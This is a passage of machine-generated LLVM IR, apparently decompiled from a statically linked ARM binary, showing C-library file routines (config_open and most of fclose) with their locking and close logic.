dec_label_pc_142bc:                               ; preds = %entry, %bb6
  %v1_142c0 = phi i32 [ 0, %entry ], [ %v0_142b8, %bb6 ]
  ret i32 %v1_142c0

; uselistorder directives
  uselistorder label %dec_label_pc_142bc, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_142d0 = load i32, i32* @r4, align 4
  store i32 %v3_142d0, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 -33996), i32* @r1, align 4
  %v0_142d8 = call i32 @__GI_fopen()
  store i32 %v0_142d8, i32* %r0.global-to-local, align 4
  store i32 %v0_142d8, i32* @r4, align 4
  %v2_142dc = icmp eq i32 %v0_142d8, 0
  br i1 %v2_142dc, label %bb, label %dec_label_pc_142e8

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_142e8:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_142f0 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_142f0, i32* %r0.global-to-local, align 4
  %v2_142f4 = icmp eq i32 %v2_142f0, 0
  br i1 %v2_142f4, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_142e8
  %v1_142f8 = load i32, i32* @r4, align 4
  %v3_142f8 = inttoptr i32 %v2_142f0 to i32*
  store i32 %v1_142f8, i32* %v3_142f8, align 4
  %v1_14300.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_142e8, %bb4
  %v1_14300 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_142e8 ], [ %v1_14300.pre, %bb4 ]
  %v2_142fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_142fc, i32* @r4, align 4
  ret i32 %v1_14300

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 4, 3, 2, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 1, 0, 7, 6, 5 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1430c = load i32, i32* @r4, align 4
  store i32 %v3_1430c, i32* %stack_var_-36, align 4
  %v6_1430c = load i32, i32* @r5, align 4
  %v9_1430c = load i32, i32* @r6, align 4
  %v12_1430c = load i32, i32* @r7, align 4
  %v2_14310 = add i32 %tmp, 52
  %v3_14310 = inttoptr i32 %v2_14310 to i32*
  %v4_14310 = load i32, i32* %v3_14310, align 4
  store i32 %v4_14310, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14318 = icmp eq i32 %v4_14310, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r8, align 4
  br i1 %v2_14318, label %dec_label_pc_1432c, label %dec_label_pc_14390

dec_label_pc_1432c:                               ; preds = %entry
  %v0_1432c = call i32 @__aeabi_read_tp()
  store i32 %v0_1432c, i32* %r0.global-to-local, align 4
  %v0_14330 = load i32, i32* @r5, align 4
  %v1_14330 = add i32 %v0_14330, 64
  %v2_14330 = inttoptr i32 %v1_14330 to i32*
  %v3_14330 = load i32, i32* %v2_14330, align 4
  store i32 %v3_14330, i32* %r3.global-to-local, align 4
  %v1_14334 = add i32 %v0_1432c, -1168
  store i32 %v1_14334, i32* @r6, align 4
  %v3_14338 = icmp uge i32 %v3_14330, %v1_14334
  store i1 %v3_14338, i1* %cpsr_c.global-to-local, align 1
  %v9_14338 = icmp eq i32 %v3_14330, %v1_14334
  br i1 %v9_14338, label %dec_label_pc_14384, label %dec_label_pc_14340

dec_label_pc_14340:                               ; preds = %dec_label_pc_1432c
  %v1_14340 = add i32 %v0_14330, 56
  store i32 %v1_14340, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_14340, i32* %r2.global-to-local, align 4
  %v0_1434c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1434c, i32* @r4, align 4
  %v1_14350115 = inttoptr i32 %v1_14340 to i32*
  %v2_14350116 = load i32, i32* %v1_14350115, align 4
  store i32 %v2_14350116, i32* %r3.global-to-local, align 4
  %v3_14354118 = icmp uge i32 %v2_14350116, %v0_1434c
  store i1 %v3_14354118, i1* %cpsr_c.global-to-local, align 1
  %v9_14354124 = icmp eq i32 %v2_14350116, %v0_1434c
  br i1 %v9_14354124, label %dec_label_pc_1435c, label %dec_label_pc_14374

dec_label_pc_1435c:                               ; preds = %dec_label_pc_14340, %dec_label_pc_1435c.dec_label_pc_14350_crit_edge
  %v0_1435c125 = phi i32 [ %v1_14354.pre, %dec_label_pc_1435c.dec_label_pc_14350_crit_edge ], [ %v0_1434c, %dec_label_pc_14340 ]
  store i32 %v0_1435c125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1436c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1436c, label %dec_label_pc_14370, label %dec_label_pc_1435c.dec_label_pc_14350_crit_edge

dec_label_pc_1435c.dec_label_pc_14350_crit_edge:  ; preds = %dec_label_pc_1435c
  %v0_14350.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14354.pre = load i32, i32* @r4, align 4
  %v1_14350 = inttoptr i32 %v0_14350.pre to i32*
  %v2_14350 = load i32, i32* %v1_14350, align 4
  store i32 %v2_14350, i32* %r3.global-to-local, align 4
  %v3_14354 = icmp uge i32 %v2_14350, %v1_14354.pre
  store i1 %v3_14354, i1* %cpsr_c.global-to-local, align 1
  %v9_14354 = icmp eq i32 %v2_14350, %v1_14354.pre
  br i1 %v9_14354, label %dec_label_pc_1435c, label %dec_label_pc_14374

dec_label_pc_14370:                               ; preds = %dec_label_pc_1435c
  %v0_14370 = load i32, i32* @r4, align 4
  store i32 %v0_14370, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14374

dec_label_pc_14374:                               ; preds = %dec_label_pc_14340, %dec_label_pc_1435c.dec_label_pc_14350_crit_edge, %dec_label_pc_14370
  %v0_14374 = phi i32 [ %v0_14370, %dec_label_pc_14370 ], [ %v2_14350116, %dec_label_pc_14340 ], [ %v2_14350, %dec_label_pc_1435c.dec_label_pc_14350_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14374 = icmp eq i32 %v0_14374, 0
  br i1 %v2_14374, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_14374
  %v1_14378 = load i32, i32* @r7, align 4
  store i32 %v1_14378, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_14374, %bb
  %v1_1437c = xor i1 %v2_14374, true
  call void @__pseudo_cond_branch(i1 %v1_1437c, i32 ptrtoint (i32* @global_var_12a60.740 to i32))
  %v0_14380 = load i32, i32* @r6, align 4
  %v1_14380 = load i32, i32* @r5, align 4
  %v2_14380 = add i32 %v1_14380, 64
  %v3_14380 = inttoptr i32 %v2_14380 to i32*
  store i32 %v0_14380, i32* %v3_14380, align 4
  %v0_14384.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14384

dec_label_pc_14384:                               ; preds = %dec_label_pc_1432c, %bb41
  %v0_14384 = phi i32 [ %v0_14330, %dec_label_pc_1432c ], [ %v0_14384.pre, %bb41 ]
  %v1_14384 = add i32 %v0_14384, 60
  %v2_14384 = inttoptr i32 %v1_14384 to i32*
  %v3_14384 = load i32, i32* %v2_14384, align 4
  %v1_14388 = add i32 %v3_14384, 1
  store i32 %v1_14388, i32* %r3.global-to-local, align 4
  store i32 %v1_14388, i32* %v2_14384, align 4
  %v0_14390.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14390

dec_label_pc_14390:                               ; preds = %entry, %dec_label_pc_14384
  %v1_14398 = phi i32 [ %tmp, %entry ], [ %v0_14390.pre, %dec_label_pc_14384 ]
  %v1_14390 = inttoptr i32 %v1_14398 to i16*
  %v2_14390 = load i16, i16* %v1_14390, align 2
  %v3_14390 = zext i16 %v2_14390 to i32
  store i32 %v3_14390, i32* %r3.global-to-local, align 4
  %v1_14394 = and i32 %v3_14390, 64
  %v2_14394 = icmp eq i32 %v1_14394, 0
  br i1 %v2_14394, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_14390
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_14390, %bb42
  %storemerge = phi i32 [ %v1_14398, %bb42 ], [ %v1_14394, %dec_label_pc_14390 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 82848, i32* @lr, align 4
  %v1_1439c = xor i1 %v2_14394, true
  call void @__pseudo_cond_branch(i1 %v1_1439c, i32 ptrtoint (i32* @global_var_151e0.841 to i32))
  %v0_143a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_143a0, i32* %fp.global-to-local, align 4
  %v0_143a4 = load i32, i32* @r5, align 4
  %v1_143a4 = add i32 %v0_143a4, 4
  %v2_143a4 = inttoptr i32 %v1_143a4 to i32*
  %v3_143a4 = load i32, i32* %v2_143a4, align 4
  store i32 %v3_143a4, i32* %r0.global-to-local, align 4
  %v1_143a8 = call i32 @__GI___libc_close(i32 %v3_143a4)
  store i32 %v1_143a8, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_143b0 = load i32, i32* @r8, align 4
  %v2_143b0 = add i32 %v0_143b0, 160
  %v3_143b0 = inttoptr i32 %v2_143b0 to i32*
  %v4_143b0 = load i32, i32* %v3_143b0, align 4
  store i32 %v4_143b0, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_143b4 = icmp slt i32 %v1_143a8, 0
  br i1 %v1_143b4, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_143bc = add i32 %v4_143b0, 8
  %v2_143bc = inttoptr i32 %v1_143bc to i32*
  %v3_143bc = load i32, i32* %v2_143bc, align 4
  store i32 %v3_143bc, i32* %r3.global-to-local, align 4
  %v0_143c0 = call i32 @__aeabi_read_tp()
  store i32 %v0_143c0, i32* %r0.global-to-local, align 4
  %v1_143c4 = add i32 %v0_143c0, -1168
  store i32 %v1_143c4, i32* %sl.global-to-local, align 4
  %v0_143c8 = load i32, i32* %r3.global-to-local, align 4
  %v3_143c8 = icmp uge i32 %v0_143c8, %v1_143c4
  store i1 %v3_143c8, i1* %cpsr_c.global-to-local, align 1
  %v9_143c8 = icmp eq i32 %v0_143c8, %v1_143c4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_143d0 = load i32, i32* @r5, align 4
  %v2_143d0 = add i32 %v1_143d0, 4
  %v3_143d0 = inttoptr i32 %v2_143d0 to i32*
  store i32 -1, i32* %v3_143d0, align 4
  br i1 %v9_143c8, label %dec_label_pc_14418, label %dec_label_pc_143d8

dec_label_pc_143d8:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_143dc = load i32, i32* @r7, align 4
  store i32 %v0_143dc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_143e4108 = inttoptr i32 %v0_143dc to i32*
  %v2_143e4109 = load i32, i32* %v1_143e4108, align 4
  store i32 %v2_143e4109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_143e8111 = icmp eq i32 %v2_143e4109, 0
  br i1 %v9_143e8111, label %dec_label_pc_143f0, label %dec_label_pc_14408

dec_label_pc_143f0:                               ; preds = %dec_label_pc_143d8, %dec_label_pc_143f0.dec_label_pc_143e4_crit_edge
  %v0_143f0112 = phi i32 [ %v1_143e8.pre, %dec_label_pc_143f0.dec_label_pc_143e4_crit_edge ], [ 0, %dec_label_pc_143d8 ]
  store i32 %v0_143f0112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14400 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14400, label %dec_label_pc_14404, label %dec_label_pc_143f0.dec_label_pc_143e4_crit_edge

dec_label_pc_143f0.dec_label_pc_143e4_crit_edge:  ; preds = %dec_label_pc_143f0
  %v0_143e4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_143e8.pre = load i32, i32* @r4, align 4
  %v1_143e4 = inttoptr i32 %v0_143e4.pre to i32*
  %v2_143e4 = load i32, i32* %v1_143e4, align 4
  store i32 %v2_143e4, i32* %r3.global-to-local, align 4
  %v3_143e8 = icmp uge i32 %v2_143e4, %v1_143e8.pre
  store i1 %v3_143e8, i1* %cpsr_c.global-to-local, align 1
  %v9_143e8 = icmp eq i32 %v2_143e4, %v1_143e8.pre
  br i1 %v9_143e8, label %dec_label_pc_143f0, label %dec_label_pc_14408

dec_label_pc_14404:                               ; preds = %dec_label_pc_143f0
  %v0_14404 = load i32, i32* @r4, align 4
  store i32 %v0_14404, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14408

dec_label_pc_14408:                               ; preds = %dec_label_pc_143d8, %dec_label_pc_143f0.dec_label_pc_143e4_crit_edge, %dec_label_pc_14404
  %v0_14408 = phi i32 [ %v0_14404, %dec_label_pc_14404 ], [ %v2_143e4109, %dec_label_pc_143d8 ], [ %v2_143e4, %dec_label_pc_143f0.dec_label_pc_143e4_crit_edge ]
  %v1_14408 = phi i32 [ %v0_14404, %dec_label_pc_14404 ], [ 0, %dec_label_pc_143d8 ], [ %v1_143e8.pre, %dec_label_pc_143f0.dec_label_pc_143e4_crit_edge ]
  %v3_14408 = icmp uge i32 %v0_14408, %v1_14408
  store i1 %v3_14408, i1* %cpsr_c.global-to-local, align 1
  %v9_14408 = icmp eq i32 %v0_14408, %v1_14408
  br i1 %v9_14408, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_14408
  %v1_1440c = load i32, i32* @r7, align 4
  store i32 %v1_1440c, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_14408, %bb46
  %v1_14410 = xor i1 %v9_14408, true
  call void @__pseudo_cond_branch(i1 %v1_14410, i32 ptrtoint (i32* @global_var_12a60.740 to i32))
  %v0_14414 = load i32, i32* %sl.global-to-local, align 4
  %v1_14414 = load i32, i32* @r7, align 4
  %v2_14414 = add i32 %v1_14414, 8
  %v3_14414 = inttoptr i32 %v2_14414 to i32*
  store i32 %v0_14414, i32* %v3_14414, align 4
  br label %dec_label_pc_14418

dec_label_pc_14418:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1441c = load i32, i32* @r8, align 4
  %v2_1441c = add i32 %v0_1441c, 160
  %v3_1441c = inttoptr i32 %v2_1441c to i32*
  %v4_1441c = load i32, i32* %v3_1441c, align 4
  store i32 %v4_1441c, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14424 = add i32 %v0_1441c, 12
  %v3_14424 = inttoptr i32 %v2_14424 to i32*
  %v4_14424 = load i32, i32* %v3_14424, align 4
  store i32 %v4_14424, i32* %r2.global-to-local, align 4
  %v1_14428 = add i32 %v4_1441c, 4
  %v2_14428 = inttoptr i32 %v1_14428 to i32*
  %v3_14428 = load i32, i32* %v2_14428, align 4
  store i32 %v3_14428, i32* %r1.global-to-local, align 4
  %v1_1442c = inttoptr i32 %v4_14424 to i32*
  %v2_1442c = load i32, i32* %v1_1442c, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14430 = icmp eq i32 %v3_14428, 0
  %v1_14434 = add i32 %v2_1442c, 1
  store i32 %v1_14434, i32* %r3.global-to-local, align 4
  store i32 %v1_14434, i32* %v1_1442c, align 4
  br i1 %v2_14430, label %dec_label_pc_14440, label %dec_label_pc_144a0

dec_label_pc_14440:                               ; preds = %dec_label_pc_14418
  %v0_14440 = load i32, i32* %r1.global-to-local, align 4
  %v1_14440 = load i32, i32* %r0.global-to-local, align 4
  %v2_14440 = add i32 %v1_14440, 8
  %v3_14440 = inttoptr i32 %v2_14440 to i32*
  store i32 %v0_14440, i32* %v3_14440, align 4
  %v0_14444 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14444, i32* @r7, align 4
  br label %dec_label_pc_14448

dec_label_pc_14448:                               ; preds = %dec_label_pc_14478.dec_label_pc_14448_crit_edge, %dec_label_pc_14440
  %v0_14448 = phi i32 [ %v0_14448.pre, %dec_label_pc_14478.dec_label_pc_14448_crit_edge ], [ %v0_14444, %dec_label_pc_14440 ]
  %v1_14448 = inttoptr i32 %v0_14448 to i32*
  %v2_14448 = load i32, i32* %v1_14448, align 4
  store i32 %v2_14448, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_14448, i32* %r2.global-to-local, align 4
  %v2_1445496 = load i32, i32* %v1_14448, align 4
  store i32 %v2_1445496, i32* %r3.global-to-local, align 4
  %v3_1445898 = icmp uge i32 %v2_1445496, %v2_14448
  store i1 %v3_1445898, i1* %cpsr_c.global-to-local, align 1
  %v9_14458104 = icmp eq i32 %v2_1445496, %v2_14448
  br i1 %v9_14458104, label %dec_label_pc_14460, label %dec_label_pc_14478

dec_label_pc_14460:                               ; preds = %dec_label_pc_14448, %dec_label_pc_14460.dec_label_pc_14454_crit_edge
  %v0_14460105 = phi i32 [ %v1_14458.pre, %dec_label_pc_14460.dec_label_pc_14454_crit_edge ], [ %v2_14448, %dec_label_pc_14448 ]
  store i32 %v0_14460105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14470 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14470, label %dec_label_pc_14474, label %dec_label_pc_14460.dec_label_pc_14454_crit_edge

dec_label_pc_14460.dec_label_pc_14454_crit_edge:  ; preds = %dec_label_pc_14460
  %v0_14454.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14458.pre = load i32, i32* @r4, align 4
  %v1_14454 = inttoptr i32 %v0_14454.pre to i32*
  %v2_14454 = load i32, i32* %v1_14454, align 4
  store i32 %v2_14454, i32* %r3.global-to-local, align 4
  %v3_14458 = icmp uge i32 %v2_14454, %v1_14458.pre
  store i1 %v3_14458, i1* %cpsr_c.global-to-local, align 1
  %v9_14458 = icmp eq i32 %v2_14454, %v1_14458.pre
  br i1 %v9_14458, label %dec_label_pc_14460, label %dec_label_pc_14478

dec_label_pc_14474:                               ; preds = %dec_label_pc_14460
  %v0_14474 = load i32, i32* @r4, align 4
  store i32 %v0_14474, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14478

dec_label_pc_14478:                               ; preds = %dec_label_pc_14448, %dec_label_pc_14460.dec_label_pc_14454_crit_edge, %dec_label_pc_14474
  %v0_14480 = phi i32 [ %v0_14474, %dec_label_pc_14474 ], [ %v2_1445496, %dec_label_pc_14448 ], [ %v2_14454, %dec_label_pc_14460.dec_label_pc_14454_crit_edge ]
  %v1_14478 = phi i32 [ %v0_14474, %dec_label_pc_14474 ], [ %v2_14448, %dec_label_pc_14448 ], [ %v1_14458.pre, %dec_label_pc_14460.dec_label_pc_14454_crit_edge ]
  %v3_14478 = icmp uge i32 %v0_14480, %v1_14478
  store i1 %v3_14478, i1* %cpsr_c.global-to-local, align 1
  %v9_14478 = icmp eq i32 %v0_14480, %v1_14478
  br i1 %v9_14478, label %dec_label_pc_14480, label %dec_label_pc_14478.dec_label_pc_14448_crit_edge

dec_label_pc_14478.dec_label_pc_14448_crit_edge:  ; preds = %dec_label_pc_14478
  %v0_14448.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14448

dec_label_pc_14480:                               ; preds = %dec_label_pc_14478
  %v2_14480 = icmp ne i32 %v1_14478, 0
  store i1 %v2_14480, i1* %cpsr_c.global-to-local, align 1
  %v7_14484 = icmp slt i32 %v1_14478, 2
  br i1 %v7_14484, label %dec_label_pc_144a0, label %dec_label_pc_14488

dec_label_pc_14488:                               ; preds = %dec_label_pc_14480
  %v0_14488 = load i32, i32* @r7, align 4
  store i32 %v0_14488, i32* %r0.global-to-local, align 4
  %v0_1448c = load i32, i32* %r1.global-to-local, align 4
  %v1_1448c = add i32 %v0_1448c, 129
  store i32 %v1_1448c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_144a0

dec_label_pc_144a0:                               ; preds = %dec_label_pc_14418, %dec_label_pc_14488, %dec_label_pc_14480
  %v0_144a0 = load i32, i32* @r5, align 4
  %v1_144a0 = inttoptr i32 %v0_144a0 to i16*
  %v2_144a0 = load i16, i16* %v1_144a0, align 2
  %v3_144a0 = zext i16 %v2_144a0 to i32
  %v1_144a4 = and i32 %v3_144a0, 24576
  %v1_144a8 = or i32 %v1_144a4, 48
  store i32 %v1_144a8, i32* %r3.global-to-local, align 4
  %v0_144ac = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_144ac = icmp eq i32 %v0_144ac, 0
  %v1_144b0 = trunc i32 %v1_144a8 to i16
  store i16 %v1_144b0, i16* %v1_144a0, align 2
  br i1 %v2_144ac, label %dec_label_pc_144b8, label %dec_label_pc_1452c

dec_label_pc_144b8:                               ; preds = %dec_label_pc_144a0
  %v0_144b8 = load i32, i32* @r5, align 4
  %v1_144b8 = add i32 %v0_144b8, 60
  %v2_144b8 = inttoptr i32 %v1_144b8 to i32*
  %v3_144b8 = load i32, i32* %v2_144b8, align 4
  %v1_144bc = add i32 %v3_144b8, -1
  store i32 %v1_144bc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_144c0 = icmp eq i32 %v1_144bc, 0
  store i32 %v1_144bc, i32* %v2_144b8, align 4
  br i1 %v2_144c0, label %dec_label_pc_144cc, label %dec_label_pc_1452c

dec_label_pc_144cc:                               ; preds = %dec_label_pc_144b8
  %v0_144cc = load i32, i32* %r3.global-to-local, align 4
  %v1_144cc = load i32, i32* @r5, align 4
  %v2_144cc = add i32 %v1_144cc, 64
  %v3_144cc = inttoptr i32 %v2_144cc to i32*
  store i32 %v0_144cc, i32* %v3_144cc, align 4
  %v0_144d0 = load i32, i32* @r5, align 4
  %v1_144d0 = add i32 %v0_144d0, 56
  store i32 %v1_144d0, i32* @r6, align 4
  br label %dec_label_pc_144d4

dec_label_pc_144d4:                               ; preds = %dec_label_pc_14504.dec_label_pc_144d4_crit_edge, %dec_label_pc_144cc
  %v0_144dc = phi i32 [ %v0_144dc.pre, %dec_label_pc_14504.dec_label_pc_144d4_crit_edge ], [ %v1_144d0, %dec_label_pc_144cc ]
  %v0_144d4 = phi i32 [ %v0_144d4.pre, %dec_label_pc_14504.dec_label_pc_144d4_crit_edge ], [ %v0_144d0, %dec_label_pc_144cc ]
  %v1_144d4 = add i32 %v0_144d4, 56
  %v2_144d4 = inttoptr i32 %v1_144d4 to i32*
  %v3_144d4 = load i32, i32* %v2_144d4, align 4
  store i32 %v3_144d4, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_144dc, i32* %r2.global-to-local, align 4
  %v1_144e082 = inttoptr i32 %v0_144dc to i32*
  %v2_144e083 = load i32, i32* %v1_144e082, align 4
  store i32 %v2_144e083, i32* %r3.global-to-local, align 4
  %v3_144e485 = icmp uge i32 %v2_144e083, %v3_144d4
  store i1 %v3_144e485, i1* %cpsr_c.global-to-local, align 1
  %v9_144e491 = icmp eq i32 %v2_144e083, %v3_144d4
  br i1 %v9_144e491, label %dec_label_pc_144ec, label %dec_label_pc_14504

dec_label_pc_144ec:                               ; preds = %dec_label_pc_144d4, %dec_label_pc_144ec.dec_label_pc_144e0_crit_edge
  %v0_144ec92 = phi i32 [ %v1_144e4.pre, %dec_label_pc_144ec.dec_label_pc_144e0_crit_edge ], [ %v3_144d4, %dec_label_pc_144d4 ]
  store i32 %v0_144ec92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_144fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_144fc, label %dec_label_pc_14500, label %dec_label_pc_144ec.dec_label_pc_144e0_crit_edge

dec_label_pc_144ec.dec_label_pc_144e0_crit_edge:  ; preds = %dec_label_pc_144ec
  %v0_144e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_144e4.pre = load i32, i32* @r4, align 4
  %v1_144e0 = inttoptr i32 %v0_144e0.pre to i32*
  %v2_144e0 = load i32, i32* %v1_144e0, align 4
  store i32 %v2_144e0, i32* %r3.global-to-local, align 4
  %v3_144e4 = icmp uge i32 %v2_144e0, %v1_144e4.pre
  store i1 %v3_144e4, i1* %cpsr_c.global-to-local, align 1
  %v9_144e4 = icmp eq i32 %v2_144e0, %v1_144e4.pre
  br i1 %v9_144e4, label %dec_label_pc_144ec, label %dec_label_pc_14504

dec_label_pc_14500:                               ; preds = %dec_label_pc_144ec
  %v0_14500 = load i32, i32* @r4, align 4
  store i32 %v0_14500, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14504

dec_label_pc_14504:                               ; preds = %dec_label_pc_144d4, %dec_label_pc_144ec.dec_label_pc_144e0_crit_edge, %dec_label_pc_14500
  %v0_1450c = phi i32 [ %v0_14500, %dec_label_pc_14500 ], [ %v2_144e083, %dec_label_pc_144d4 ], [ %v2_144e0, %dec_label_pc_144ec.dec_label_pc_144e0_crit_edge ]
  %v1_14504 = phi i32 [ %v0_14500, %dec_label_pc_14500 ], [ %v3_144d4, %dec_label_pc_144d4 ], [ %v1_144e4.pre, %dec_label_pc_144ec.dec_label_pc_144e0_crit_edge ]
  %v3_14504 = icmp uge i32 %v0_1450c, %v1_14504
  store i1 %v3_14504, i1* %cpsr_c.global-to-local, align 1
  %v9_14504 = icmp eq i32 %v0_1450c, %v1_14504
  br i1 %v9_14504, label %dec_label_pc_1450c, label %dec_label_pc_14504.dec_label_pc_144d4_crit_edge

dec_label_pc_14504.dec_label_pc_144d4_crit_edge:  ; preds = %dec_label_pc_14504
  %v0_144d4.pre = load i32, i32* @r5, align 4
  %v0_144dc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_144d4

dec_label_pc_1450c:                               ; preds = %dec_label_pc_14504
  %v2_1450c = icmp ne i32 %v1_14504, 0
  store i1 %v2_1450c, i1* %cpsr_c.global-to-local, align 1
  %v7_14510 = icmp slt i32 %v1_14504, 2
  br i1 %v7_14510, label %dec_label_pc_1452c, label %dec_label_pc_14514

dec_label_pc_14514:                               ; preds = %dec_label_pc_1450c
  %v0_14514 = load i32, i32* @r5, align 4
  %v1_14514 = add i32 %v0_14514, 56
  store i32 %v1_14514, i32* %r0.global-to-local, align 4
  %v0_14518 = load i32, i32* %r1.global-to-local, align 4
  %v1_14518 = add i32 %v0_14518, 129
  store i32 %v1_14518, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1452c

dec_label_pc_1452c:                               ; preds = %dec_label_pc_144b8, %dec_label_pc_144a0, %dec_label_pc_14514, %dec_label_pc_1450c
  %v0_1452c = load i32, i32* @r5, align 4
  %v1_1452c = inttoptr i32 %v0_1452c to i16*
  %v2_1452c = load i16, i16* %v1_1452c, align 2
  %v3_1452c = zext i16 %v2_1452c to i32
  store i32 %v3_1452c, i32* %r3.global-to-local, align 4
  %v1_14530 = and i32 %v3_1452c, 16384
  %v2_14530 = icmp eq i32 %v1_14530, 0
  br i1 %v2_14530, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_1452c
  %v2_14534 = add i32 %v0_1452c, 8
  %v3_14534 = inttoptr i32 %v2_14534 to i32*
  %v4_14534 = load i32, i32* %v3_14534, align 4
  store i32 %v4_14534, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_1452c, %bb48
  %v1_14538 = xor i1 %v2_14530, true
  call void @__pseudo_cond_branch(i1 %v1_14538, i32 ptrtoint (i32* @global_var_11abc.29 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_14540 = load i32, i32* @r8, align 4
  %v2_14540 = add i32 %v0_14540, 160
  %v3_14540 = inttoptr i32 %v2_14540 to i32*
  %v4_14540 = load i32, i32* %v3_14540, align 4
  store i32 %v4_14540, i32* @r5, align 4
  %v1_14544 = add i32 %v4_14540, 8
  %v2_14544 = inttoptr i32 %v1_14544 to i32*
  %v3_14544 = load i32, i32* %v2_14544, align 4
  store i32 %v3_14544, i32* %r3.global-to-local, align 4
  %v1_14548 = load i32, i32* %sl.global-to-local, align 4
  %v3_14548 = icmp uge i32 %v3_14544, %v1_14548
  store i1 %v3_14548, i1* %cpsr_c.global-to-local, align 1
